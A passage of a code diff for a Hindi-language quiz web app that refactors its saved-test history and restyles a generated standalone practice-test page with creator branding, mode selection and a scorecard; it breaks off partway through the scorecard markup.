-          time: new Date().toLocaleTimeString('hi-IN', { hour: '2-digit', minute: '2-digit' }),
-          count: questions.length,
-          data: questions
-        };
-        history.unshift(newItem);
-        if (history.length > 40) history.pop();
+        history.unshift({ topic: activeQuizTopic, count: questions.length, data: questions, date: new Date().toLocaleDateString('hi-IN') });
+        if (history.length > 30) history.pop();
         localStorage.setItem('sph_saved_quizzes', JSON.stringify(history));
         updateHistoryCount();
       } catch (e) {}
     }
 
     function updateHistoryCount() {
-      try {
-        const history = JSON.parse(localStorage.getItem('sph_saved_quizzes') || '[]');
-        document.getElementById('histCount').innerText = `${history.length} Saved`;
-      } catch (e) {}
+      const h = JSON.parse(localStorage.getItem('sph_saved_quizzes') || '[]');
+      document.getElementById('histCount').innerText = h.length;
     }
 
     function openHistoryModal() {
-      const history = JSON.parse(localStorage.getItem('sph_saved_quizzes') || '[]');
-      const container = document.getElementById('historyListContainer');
-      container.innerHTML = '';
-
-      if (history.length === 0) {
-        container.innerHTML = `<div style="text-align:center; padding:20px; color:var(--text-muted); font-size:0.85rem;">कोई सेव किया गया टेस्ट नहीं है।</div>`;
-      } else {
-        history.forEach((item, idx) => {
-          const div = document.createElement('div');
-          div.style = "padding:12px; border:1px solid var(--card-border); border-radius:12px; margin-bottom:8px; background:var(--opt-bg); display:flex; justify-content:space-between; align-items:center;";
-          div.innerHTML = `
-            <div>
-              <div style="font-weight:800; font-size:0.88rem;">${item.topic}</div>
-              <div style="font-size:0.72rem; color:var(--text-muted); margin-top:2px;">📅 ${item.date} (${item.count} सवाल)</div>
-            </div>
-            <button onclick="loadSavedQuiz(${idx})" style="padding:7px 12px; background:var(--accent-blue); color:#fff; border:none; border-radius:8px; font-weight:700; font-size:0.78rem; cursor:pointer;">टेस्ट दें</button>
-          `;
-          container.appendChild(div);
-        });
-      }
+      const h = JSON.parse(localStorage.getItem('sph_saved_quizzes') || '[]');
+      const box = document.getElementById('historyListContainer');
+      box.innerHTML = h.length ? '' : '<div style="text-align:center; padding:10px;">कोई टेस्ट सेव नहीं है।</div>';
+      h.forEach((item, idx) => {
+        const d = document.createElement('div');
+        d.style = "padding:10px; border-bottom:1px solid var(--card-border); display:flex; justify-content:space-between; align-items:center;";
+        d.innerHTML = `<div><b>${item.topic}</b> (${item.count} Qs)<br><small style="color:var(--text-muted);">${item.date}</small></div><button onclick="loadSavedQuiz(${idx})" class="btn-icon">टेस्ट दें</button>`;
+        box.appendChild(d);
+      });
       document.getElementById('historyModal').style.display = 'flex';
     }
 
-    function closeHistoryModal() {
-      document.getElementById('historyModal').style.display = 'none';
-    }
+    function closeHistoryModal() { document.getElementById('historyModal').style.display = 'none'; }
 
     function loadSavedQuiz(idx) {
-      const history = JSON.parse(localStorage.getItem('sph_saved_quizzes') || '[]');
-      if (history[idx]) {
-        quizData = history[idx].data;
-        originalQuizData = [...quizData];
-        activeQuizTopic = history[idx].topic;
+      const h = JSON.parse(localStorage.getItem('sph_saved_quizzes') || '[]');
+      if (h[idx]) {
+        quizData = h[idx].data;
+        activeQuizTopic = h[idx].topic;
         closeHistoryModal();
-        openTimingModal();
+        showActionHub();
       }
     }
 
-    // --- SAFE TEMPLATE GENERATOR ---
+    // 🌟 COMPLETE STANDALONE HTML WITH SCREENSHOT START SCREEN & WORKFLOW
     function generatePareekshaKendraHtmlString(questions) {
       const formattedRawData = questions.map((q) => {
         let correctIdx = q.answer;
@@ -1483,13 +1397,18 @@
           question: q.question,
           options: (q.options && q.options.length > 0) ? q.options : ["Option 1", "Option 2", "Option 3", "Option 4"],
           answer: Number(correctIdx),
-          exp: q.explanation || "PAREEKSHA KENDRA Official Solution"
+          exp: q.explanation || "Official Solution & Concept Details"
         };
       });
 
       const totalQs = formattedRawData.length;
       const durationMins = Math.max(5, Math.ceil(totalQs * 0.8));
       const safeTitle = activeQuizTopic.replace(/"/g, '&quot;');
+      const creatorName = ((document.getElementById('customCreatorName')?.value || 'ANKIT').trim() || 'ANKIT');
+      
+      let creatorTg = (document.getElementById('customTelegramLink')?.value || '').trim() || 't.me/PAREEKSHA_KENDRA';
+      if (!creatorTg.startsWith('http')) creatorTg = 'https://' + creatorTg.replace(/^@/, 't.me/');
+
       const S_OPEN = '<' + 'script>';
       const S_CLOSE = '<' + '/script>';
 
@@ -1498,352 +1417,260 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>${safeTitle} (${totalQs} Qs) | Pareeksha Kendra</title>
+  <title>${safeTitle} | ${creatorName}</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     :root {
-      --bg: #f8fafc; --card-bg: #ffffff; --card-border: #e2e8f0; --text-main: #0f172a; --text-muted: #64748b;
-      --accent-gold: #ff5722; --accent-emerald: #10b981; --accent-blue: #2563eb; --danger: #dc2626;
-      --opt-bg: #f8fafc; --opt-border: #cbd5e1; --green-light: #ecfdf5; --orange-light: rgba(255, 87, 34, 0.12);
+      --bg: #fffbf2; --card-bg: #ffffff; --card-border: #f0e6d2; --text-main: #2b1810; --text-muted: #7c6858;
+      --accent-gold: #c2410c; --accent-emerald: #15803d; --accent-blue: #1d4ed8; --danger: #dc2626;
+      --opt-bg: #fffaf0; --opt-border: #e8d9c5; --green-light: #ecfdf5; --orange-light: rgba(194, 65, 12, 0.1);
     }
     [data-theme="dark"] {
-      --bg: #07090e; --card-bg: #111827; --card-border: rgba(255, 255, 255, 0.12); --text-main: #f8fafc; --text-muted: #94a3b8;
-      --accent-gold: #ff7043; --accent-emerald: #10b981; --accent-blue: #3b82f6; --danger: #ef4444;
-      --opt-bg: rgba(255, 255, 255, 0.04); --opt-border: rgba(255, 255, 255, 0.1); --green-light: rgba(16, 185, 129, 0.15); --orange-light: rgba(255, 87, 34, 0.15);
+      --bg: #090d16; --card-bg: #111827; --card-border: rgba(255, 255, 255, 0.12); --text-main: #f8fafc; --text-muted: #94a3b8;
+      --accent-gold: #fb923c; --accent-emerald: #10b981; --accent-blue: #38bdf8; --danger: #ef4444;
+      --opt-bg: rgba(255, 255, 255, 0.04); --opt-border: rgba(255, 255, 255, 0.1); --green-light: rgba(16, 185, 129, 0.15); --orange-light: rgba(251, 146, 60, 0.15);
     }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
     body { background-color: var(--bg); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 16px; font-size: 16px; }
-    .wrapper { width: 100%; max-width: 550px; margin: 0 auto; }
-    header { width: 100%; max-width: 550px; display: flex; align-items: center; justify-content: space-between; padding: 10px 0 16px; border-bottom: 1px solid var(--card-border); margin-bottom: 16px; }
-    .brand { display: flex; align-items: center; gap: 10px; }
-    .brand-icon { width: 40px; height: 40px; border-radius: 12px; background: linear-gradient(135deg, #ff5722, #f43f5e); display: flex; align-items: center; justify-content: center; font-size: 22px; color: #fff; font-family: 'Outfit', sans-serif; font-weight: 900; }
-    .brand-title { font-family: 'Outfit', sans-serif; font-size: 1.15rem; font-weight: 800; color: var(--text-main); }
-    .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); width: 100%; margin-bottom: 16px; }
-    .btn-main { width: 100%; padding: 15px; border-radius: 14px; border: none; background: linear-gradient(135deg, #ff5722, #f43f5e); color: #fff; font-family: 'Outfit', sans-serif; font-size: 1.05rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 14px; box-shadow: 0 4px 18px rgba(255, 87, 34, 0.3); }
-    .btn-open-palette { background: rgba(37, 99, 235, 0.1); border: 1px solid var(--accent-blue); color: var(--accent-blue); padding: 5px 12px; border-radius: 20px; font-size: 0.78rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; gap: 5px; }
-    .live-q-timer { background: rgba(255, 87, 34, 0.12); border: 1px solid var(--accent-gold); color: var(--accent-gold); padding: 4px 10px; border-radius: 20px; font-family: 'Outfit', monospace; font-weight: 800; font-size: 0.85rem; }
+    .wrapper { width: 100%; max-width: 500px; margin: 0 auto; }
+    
+    .top-pill-tag { display: inline-flex; align-items: center; gap: 6px; background: rgba(194, 65, 12, 0.1); border: 1px solid rgba(194, 65, 12, 0.3); color: var(--accent-gold); font-size: 0.76rem; font-weight: 800; padding: 6px 16px; border-radius: 30px; margin-bottom: 12px; letter-spacing: 0.5px; }
+    .hero-title { font-family: 'Outfit', sans-serif; font-size: 1.6rem; font-weight: 900; line-height: 1.25; color: var(--text-main); margin-bottom: 6px; letter-spacing: -0.5px; text-transform: uppercase; text-align: center; }
+    .hero-sub { font-size: 0.85rem; color: var(--text-muted); font-weight: 700; margin-bottom: 16px; text-align: center; }
+    
+    .presenter-card { background: linear-gradient(135deg, rgba(255, 247, 230, 0.9), rgba(255, 237, 213, 0.9)); border: 1.5px solid #fed7aa; border-radius: 20px; padding: 16px; text-align: center; margin-bottom: 16px; }
+    [data-theme="dark"] .presenter-card { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.12); }
+    .presenter-label { font-size: 0.72rem; font-weight: 900; color: #9a3412; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+    .presenter-name { font-family: 'Outfit', sans-serif; font-size: 1.5rem; font-weight: 900; color: var(--text-main); }
+
+    .stats-trio-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 16px; }
+    .stat-mini-box { background: var(--card-bg); border: 1.5px solid var(--card-border); border-radius: 16px; padding: 12px 6px; text-align: center; }
+    .stat-num { font-family: 'Outfit', sans-serif; font-size: 1.25rem; font-weight: 900; color: var(--text-main); }
+    .stat-lbl { font-size: 0.68rem; font-weight: 700; color: var(--text-muted); margin-top: 2px; }
+
+    .card { background: var(--card-bg); border: 1.5px solid var(--card-border); border-radius: 24px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.04); width: 100%; margin-bottom: 16px; }
+    .btn-main { width: 100%; padding: 15px; border-radius: 16px; border: none; background: linear-gradient(135deg, #7f1d1d, #450a0a); color: #fff; font-family: 'Outfit', sans-serif; font-size: 1.05rem; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 6px 20px rgba(127, 29, 29, 0.35); text-transform: uppercase; margin-top: 14px; }
+    .btn-join-tg { width: 100%; padding: 13px; border-radius: 14px; border: 1.5px solid #fed7aa; background: #fffaf0; color: #9a3412; font-weight: 800; font-size: 0.88rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; margin-top: 10px; }
+    [data-theme="dark"] .btn-join-tg { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.15); color: #fed7aa; }
+
     .q-text { font-size: 1.05rem; font-weight: 700; line-height: 1.55; margin-bottom: 18px; }
     .options-list { display: flex; flex-direction: column; gap: 10px; }
-    .opt-btn { width: 100%; text-align: left; padding: 14px 16px; background: var(--opt-bg); border: 1.5px solid var(--opt-border); border-radius: 12px; color: var(--text-main); font-size: 0.92rem; cursor: pointer; display: flex; align-items: flex-start; gap: 12px; }
-    .opt-btn.selected { border-color: var(--accent-gold) !important; background: rgba(255, 87, 34, 0.08) !important; font-weight: 700; }
-    .opt-btn.selected .opt-tag { background: var(--accent-gold); color: #ffffff; }
+    .opt-btn { width: 100%; text-align: left; padding: 14px 16px; background: var(--opt-bg); border: 1.5px solid var(--opt-border); border-radius: 14px; color: var(--text-main); font-size: 0.92rem; cursor: pointer; display: flex; align-items: flex-start; gap: 12px; }
+    .opt-btn.selected { border-color: var(--accent-gold) !important; background: var(--orange-light) !important; font-weight: 700; }
     .opt-btn.correct { background: var(--green-light) !important; border-color: var(--accent-emerald) !important; color: var(--accent-emerald) !important; font-weight: 800; }
     .opt-btn.correct .opt-tag { background: var(--accent-emerald) !important; color: #fff !important; }
-    .opt-btn.wrong { background: rgba(239, 68, 68, 0.15) !important; border-color: var(--danger) !important; color: var(--danger) !important; }
+    .opt-btn.wrong { background: rgba(220, 38, 38, 0.12) !important; border-color: var(--danger) !important; color: var(--danger) !important; }
     .opt-btn.wrong .opt-tag { background: var(--danger) !important; color: #fff !important; }
     .opt-tag { width: 26px; height: 26px; border-radius: 50%; background: rgba(0, 0, 0, 0.06); display: flex; align-items: center; justify-content: center; font-size: 0.78rem; font-weight: 800; flex-shrink: 0; }
-    .expl-box { margin-top: 14px; padding: 14px; background: rgba(255, 87, 34, 0.08); border-left: 4px solid var(--accent-gold); border-radius: 8px; font-size: 0.85rem; line-height: 1.55; display: none; }
+    .expl-box { margin-top: 14px; padding: 14px; background: var(--orange-light); border-left: 4px solid var(--accent-gold); border-radius: 8px; font-size: 0.85rem; line-height: 1.55; display: none; }
     .nav-btns { display: flex; gap: 8px; margin-top: 18px; }
-    .nav-btn { flex: 1; padding: 13px; border-radius: 12px; border: 1px solid var(--card-border); background: var(--opt-bg); color: var(--text-main); cursor: pointer; font-weight: 700; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 5px; }
-    .nav-btn-mark { border-color: #f59e0b; color: #d97706; background: #fef3c7; }
-    [data-theme="dark"] .nav-btn-mark { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
-    .nav-btn-submit { background: linear-gradient(135deg, #ff5722, #f43f5e); color: #fff; border: none; flex: 1.2; }
-    
-    .modal-overlay { position: fixed !important; top: 0 !important; left: 0 !important; right: 0 !important; bottom: 0 !important; background: rgba(0, 0, 0, 0.7) !important; backdrop-filter: blur(5px); display: none !important; align-items: center; justify-content: center; z-index: 9999 !important; padding: 20px; }
-    .modal-overlay.active, .modal-overlay[style*="display: flex"] { display: flex !important; }
-    .modal-card { background: var(--card-bg); border-radius: 20px; padding: 22px; width: 100%; max-width: 400px; border: 1px solid var(--card-border); box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-height: 85vh; overflow-y: auto; }
-    .palette-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-top: 14px; max-height: 50vh; overflow-y: auto; padding: 2px; }
-    .palette-tile { aspect-ratio: 1; border-radius: 12px; border: 1.5px solid var(--card-border); background: var(--opt-bg); display: flex; align-items: center; justify-content: center; font-family: 'Outfit', sans-serif; font-weight: 800; font-size: 16px; cursor: pointer; color: var(--text-main); }
-    .palette-tile.active { border-color: var(--accent-blue) !important; color: var(--accent-blue) !important; border-width: 2.5px !important; transform: scale(1.05); }
-    .palette-tile.answered { background: var(--green-light) !important; color: var(--accent-emerald) !important; border-color: var(--accent-emerald) !important; }
-    .palette-tile.marked { background: var(--orange-light) !important; color: var(--accent-gold) !important; border-color: var(--accent-gold) !important; }
-    .palette-stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-top: 10px; margin-bottom: 6px; text-align: center; font-size: 0.75rem; font-weight: 800; }
+    .nav-btn { flex: 1; padding: 13px; border-radius: 12px; border: 1.5px solid var(--card-border); background: var(--opt-bg); color: var(--text-main); cursor: pointer; font-weight: 700; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 5px; }
+
+    /* SCORECARD */
+    .score-hero-card { background: var(--card-bg); border: 1.5px solid var(--card-border); border-radius: 24px; padding: 28px 18px; text-align: center; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); }
+    .score-trophy-img { font-size: 46px; margin-bottom: 6px; }
+    .score-topic-title { font-family: 'Outfit', sans-serif; font-size: 1.55rem; font-weight: 900; color: var(--text-main); margin-bottom: 2px; }
+    .score-sub-inst { font-size: 0.76rem; font-weight: 800; color: var(--text-muted); letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 16px; }
+    .score-giant-number { font-family: 'Outfit', sans-serif; font-size: 3.2rem; font-weight: 900; color: #ff5722; line-height: 1; margin-bottom: 6px; letter-spacing: -1px; }
+    .score-candidate-line { font-size: 0.8rem; font-weight: 900; color: var(--text-muted); letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 20px; }
+    .score-stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
+    .score-stat-card { border-radius: 16px; padding: 14px 6px; text-align: center; }
+    .score-stat-card.c-green { background: #ecfdf5; }
+    .score-stat-card.c-green b { color: #16a34a; }
+    .score-stat-card.c-red { background: #fef2f2; }
+    .score-stat-card.c-red b { color: #dc2626; }
+    .score-stat-card.c-peach { background: #fff7ed; }
+    .score-stat-card.c-peach b { color: #ea580c; }
+    .score-stat-card b { font-family: 'Outfit', sans-serif; font-size: 1.6rem; font-weight: 900; display: block; line-height: 1.1; }
+    .score-stat-card span { font-size: 0.75rem; font-weight: 800; color: var(--text-main); margin-top: 4px; display: block; }
+    .btn-score-red { width: 100%; padding: 14px; border-radius: 14px; border: none; background: linear-gradient(135deg, #ef4444, #dc2626); color: #ffffff; font-family: 'Outfit', sans-serif; font-size: 0.98rem; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; box-shadow: 0 4px 16px rgba(220, 38, 38, 0.3); }
+    .btn-score-blue { width: 100%; padding: 14px; border-radius: 14px; border: none; background: linear-gradient(135deg, #2563eb, #1d4ed8); color: #ffffff; font-family: 'Outfit', sans-serif; font-size: 0.98rem; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; box-shadow: 0 4px 16px rgba(37, 99, 235, 0.3); }
+    .btn-score-retake { width: 100%; padding: 13px; border-radius: 14px; border: 1.5px solid var(--card-border); background: var(--opt-bg); color: var(--text-main); font-family: 'Outfit', sans-serif; font-size: 0.95rem; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .sph-footer { text-align: center; margin-top: 24px; padding-top: 14px; border-top: 1px dashed var(--card-border); font-size: 0.75rem; color: var(--text-muted); }
+    .sph-footer a { color: var(--accent-blue); text-decoration: none; font-weight: 800; }
   </style>
 </head>
 <body>
   <div class="wrapper">
-    <header>
-      <div class="brand">
-        <div class="brand-icon">P</div>
-        <div>
-          <div class="brand-title">PAREEKSHA KENDRA</div>
-          <div style="font-size:0.7rem; color:var(--accent-gold); font-weight:700;">AUTHENTIC TEST DRILL</div>
+
+    <!-- 1. 🌟 EXACT SCREENSHOT START SCREEN -->
+    <div id="startScreen" style="text-align: center;">
+      <div class="top-pill-tag">
+        <i class="fa-solid fa-graduation-cap"></i> SPECIAL DRILL • ALL IN ONE
+      </div>
+      <h1 class="hero-title">${safeTitle}</h1>
+      <div class="hero-sub">Complete 100% Authentic Practice Drill</div>
+
+      <div class="presenter-card">
+        <div class="presenter-label">PRESENTED BY</div>
+        <div class="presenter-name">👑 ${creatorName} 👑</div>
+        <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 2px;">Official Practice Portal</div>
+      </div>
+
+      <div class="stats-trio-grid">
+        <div class="stat-mini-box">
+          <div class="stat-num">${totalQs}</div>
+          <div class="stat-lbl">Questions</div>
+        </div>
+        <div class="stat-mini-box">
+          <div class="stat-num">${durationMins}m</div>
+          <div class="stat-lbl">Time Limit</div>
+        </div>
+        <div class="stat-mini-box">
+          <div class="stat-num">+2 / -0.5</div>
+          <div class="stat-lbl">Marking</div>
         </div>
       </div>
-      <button onclick="toggleTheme()" style="background:var(--card-bg); border:1px solid var(--card-border); width:36px; height:36px; border-radius:50%; cursor:pointer; color:var(--text-main);" id="themeBtn">
-        <i class="fa-solid fa-moon"></i>
-      </button>
-    </header>
 
-    <div id="startScreen" class="card" style="text-align: center;">
-      <h2 style="font-family:'Outfit'; font-size:1.35rem; font-weight:900; margin-bottom:4px; color:var(--text-main);">${safeTitle}</h2>
-      <div style="font-size:0.75rem; color:var(--accent-gold); font-weight:700; margin-bottom:16px;">Crafted with ❤️ by Ankit (@ankit_123422)</div>
-
-      <input type="text" id="candidateNameInput" placeholder="अपना नाम दर्ज करें (Candidate Name)..." style="width:100%; padding:12px; background:var(--opt-bg); border:1.5px solid var(--accent-blue); border-radius:12px; font-weight:700; margin-bottom:14px; outline:none; color:var(--text-main);" />
-
-      <div style="background:var(--opt-bg); border:1px solid var(--card-border); border-radius:14px; padding:12px 14px; text-align:left; font-size:0.82rem; margin-bottom:16px; display:flex; flex-direction:column; gap:8px;">
-        <div style="display:flex; justify-content:space-between;"><span>🎯 <b>Topic:</b></span><span>${safeTitle}</span></div>
-        <div style="display:flex; justify-content:space-between;"><span>❓ <b>Total Questions:</b></span><span>${totalQs} Qs</span></div>
-        <div style="display:flex; justify-content:space-between;"><span>⏱️ <b>Duration:</b></span><span>${durationMins} Mins</span></div>
-        <div style="display:flex; justify-content:space-between;"><span>✅ <b>Marking:</b></span><span style="color:var(--accent-emerald); font-weight:800;">+2.0 / -0.5</span></div>
+      <div class="card" style="text-align: left; padding: 14px;">
+        <label style="font-size: 0.76rem; font-weight: 800; color: var(--text-muted); display: block; margin-bottom: 6px;">🎮 खेलने का मोड चुनें (Choose Mode):</label>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+          <label style="display: flex; align-items: center; gap: 6px; padding: 10px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer; font-size: 0.8rem; font-weight: 800;">
+            <input type="radio" name="standaloneMode" value="instant" checked /> 🎯 तुरंत उत्तर (Instant)
+          </label>
+          <label style="display: flex; align-items: center; gap: 6px; padding: 10px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer; font-size: 0.8rem; font-weight: 800;">
+            <input type="radio" name="standaloneMode" value="mock" /> ⏱️ फुल मॉक (Exam Mock)
+          </label>
+        </div>
       </div>
 
-      <div style="text-align:left; margin-bottom:14px;">
-        <label style="font-size:0.75rem; font-weight:700; color:var(--text-muted); display:block; margin-bottom:6px;">⏱️ प्रति प्रश्न समय चुनें (Per Question Timer):</label>
-        <select id="timerChoiceSelect" style="width:100%; padding:11px; background:var(--opt-bg); border:1px solid var(--card-border); border-radius:10px; font-weight:700; color:var(--text-main); outline:none;">
-          <option value="30">⚡ 30 सेकंड / सवाल (Speed Drill)</option>
-          <option value="45">⏱️ 45 सेकंड / सवाल (Standard Exam)</option>
-          <option value="60">🎯 60 सेकंड / सवाल (Deep Practice)</option>
-          <option value="0">♾️ कोई टाइमर नहीं (Self-Paced Mode)</option>
-        </select>
-      </div>
-
-      <button class="btn-main" onclick="startExportedTest()">
-        <span>🚀 स्टार्ट मॉक टेस्ट (Start Test)</span>
+      <button class="btn-main" onclick="startStandaloneTest()">
+        🚀 START PRACTICE DRILL ➔
       </button>
 
-      <div style="display:flex; justify-content:space-between; margin-top:16px; font-size:0.75rem; font-weight:700;">
-        <a href="https://t.me/PAREEKSHA_KENDRA" target="_blank" style="color:var(--accent-blue); text-decoration:none;"><i class="fa-brands fa-telegram"></i> Telegram Channel</a>
-        <a href="https://whatsapp.com/channel/0029Vb8YQJZElah28mUs922k" target="_blank" style="color:#10b981; text-decoration:none;"><i class="fa-brands fa-whatsapp"></i> WhatsApp Channel</a>
+      <a href="${creatorTg}" target="_blank" class="btn-join-tg">
+        <i class="fa-brands fa-telegram" style="font-size:18px;"></i> JOIN US — ${creatorName} Telegram
+      </a>
+
+      <div class="sph-footer">
+        <div>🚀 Powered by <b>Silent Preparation Hub (SPH)</b></div>
+        <div style="display:flex; justify-content:center; gap:14px; margin-top:6px;">
+          <a href="https://whatsapp.com/channel/0029Vb8YQJZElah28mUs922k" target="_blank">🟢 WhatsApp Channel</a>
+          <span>•</span>
+          <a href="https://ankitraj75238-jpg.github.io/sph-app/public/laptop.html" target="_blank">💻 SPH Web Portal</a>
+        </div>
       </div>
     </div>
 
-    <div id="quizScreen" class="card" style="display: none;">
-      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid var(--card-border); gap:8px;">
+    <!-- 2. QUIZ SCREEN -->
+    <div id="quizScreen" class="card" style="display: none; margin-top: 10px;">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid var(--card-border);">
         <span id="qIndexLabel" style="font-weight:800; font-size:0.85rem;">Q 1/${totalQs}</span>
-        <button class="btn-open-palette" onclick="openPaletteModal()">
-          <i class="fa-solid fa-border-all"></i> नंबर प्लेट (<span id="paletteAnsweredCount">0</span>/${totalQs})
-        </button>
-        <span class="live-q-timer" id="liveTimerBadge">⏱️ 30s</span>
+        <span id="modeBadge" style="background:var(--orange-light); color:var(--accent-gold); padding:4px 10px; border-radius:20px; font-weight:800; font-size:0.75rem;">🎯 INSTANT QUIZ</span>
       </div>
 
-      <div class="q-text" id="qText">Loading question...</div>
+      <div class="q-text" id="qText">सवाल लोड हो रहा है...</div>
       <div class="options-list" id="optionsContainer"></div>
       <div class="expl-box" id="explanationContainer"></div>
 
       <div class="nav-btns">
         <button class="nav-btn" id="prevBtn" onclick="prevQuestion()"><i class="fa-solid fa-chevron-left"></i> Prev</button>
-        <button class="nav-btn nav-btn-mark" id="markBtn" onclick="toggleMark()"><i class="fa-solid fa-flag"></i> Mark</button>
-        <button class="nav-btn nav-btn-submit" id="nextBtn" onclick="handleNextClick()">Next <i class="fa-solid fa-chevron-right"></i></button>
+        <button class="nav-btn btn-main" style="margin-top:0; flex:1.3;" id="nextBtn" onclick="handleNextClick()">Next <i class="fa-solid fa-chevron-right"></i></button>
       </div>
     </div>
 
-    <div id="scorecardScreen" class="card" style="display: none; text-align: center;">
-      <div style="font-size: 36px; margin-bottom: 6px;">🏆</div>
-      <h2 style="font-family:'Outfit'; font-size:1.35rem; font-weight:900; color:var(--text-main);">${safeTitle}</h2>
-      <div style="font-size:0.8rem; color:var(--text-muted); margin-bottom:16px;">PAREEKSHA KENDRA OFFICIAL RESULT</div>
+    <!-- 3. SCORECARD SCREEN -->
+    <div id="scorecardScreen" style="display: none; margin-top: 10px;">
+      <div class="score-hero-card">
+        <div class="score-trophy-img">🏆</div>
+        <div class="score-topic-title">${safeTitle}</div>
+        <div class="score-sub-inst">PAREEKSHA KENDRA OFFICIAL RESULT</div>
 
-      <div id="resMarksText" style="font-size:2.5rem; font-family:'Outfit'; font-weight:900; color:var(--accent-gold); margin-bottom:4px;">0.0</div>
-      <div id="resTotalMarksText" style="font-size:0.85rem; font-weight:700; color:var(--text-muted); margin-bottom:20px;">OUT OF 0.0 MARKS</div>
+        <div class="score-giant-number" id="resMarksText">0.0 / ${totalQs * 2}</div>
+        <div class="score-candidate-line" id="resCandidateLine">CANDIDATE: ASPIRANT • MARKS: 0.0</div>
 
-      <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:8px; margin-bottom:20px;">
-        <div style="background:rgba(16, 185, 129, 0.1); padding:12px 6px; border-radius:12px;">
-          <b id="resCorrectCount" style="color:var(--accent-emerald); font-size:1.3rem;">0</b>
-          <div style="font-size:0.72rem; font-weight:700;">सही (Correct)</div>
-        </div>
-        <div style="background:rgba(239, 68, 68, 0.1); padding:12px 6px; border-radius:12px;">
-          <b id="resWrongCount" style="color:var(--danger); font-size:1.3rem;">0</b>
-          <div style="font-size:0.72rem; font-weight:700;">गलत (Wrong)</div>
-        </div>
-        <div style="background:rgba(255, 87, 34, 0.1); padding:12px 6px; border-radius:12px;">
-          <b id="resSkipCount" style="color:var(--accent-gold); font-size:1.3rem;">0</b>
-          <div style="font-size:0.72rem; font-weight:700;">छोड़े (Skipped)</div>
-        </div>
-      </div>
-
-      <button id="btnResolveMistakesOnly" class="btn-main" onclick="reSolveMistakesOnly()" style="background:linear-gradient(135deg, #ef4444, #dc2626); margin-bottom:10px; display:none;">
-        <i class="fa-solid fa-rotate-left"></i> केवल गलत सवाल हल करें (<span id="mistakeBadgeCount">0</span> Qs)
-      </button>
-
-      <button class="btn-main" onclick="startReviewMode()" style="background:var(--accent-blue); margin-bottom:10px;">
-        <i class="fa-solid fa-magnifying-glass"></i> सही उत्तर और व्याख्या देखें (Review Answers)
-      </button>
-
-      <button onclick="retakeFullTest()" class="nav-btn" style="width:100%; padding:13px; font-weight:800;">
-        <i class="fa-solid fa-arrows-rotate"></i> दोबारा पूरा टेस्ट दें (Retake)
-      </button>
-    </div>
-
-    <div class="modal-overlay" id="paletteModal">
-      <div class="modal-card">
-        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--card-border); padding-bottom:8px;">
-          <span style="font-family:'Outfit'; font-weight:800; font-size:18px;">Question Palette (नंबर प्लेट)</span>
-          <i class="fa-solid fa-xmark" style="cursor:pointer; font-size:22px;" onclick="closePaletteModal()"></i>
-        </div>
-        <p style="font-size:12px; color:var(--text-muted); margin-top:6px;">सवालों के बीच स्विच करने के लिए नंबर पर टैप करें:</p>
-        
-        <div class="palette-stats-row">
-          <div style="background:var(--green-light); color:var(--accent-emerald); padding:5px; border-radius:8px;">
-            ✅ <span id="statAnswered">0</span> Done
+        <div class="score-stats-grid">
+          <div class="score-stat-card c-green">
+            <b id="resCorrectCount">0</b>
+            <span>सही (Correct)</span>
           </div>
-          <div style="background:var(--orange-light); color:var(--accent-gold); padding:5px; border-radius:8px;">
-            🚩 <span id="statMarked">0</span> Marked
+          <div class="score-stat-card c-red">
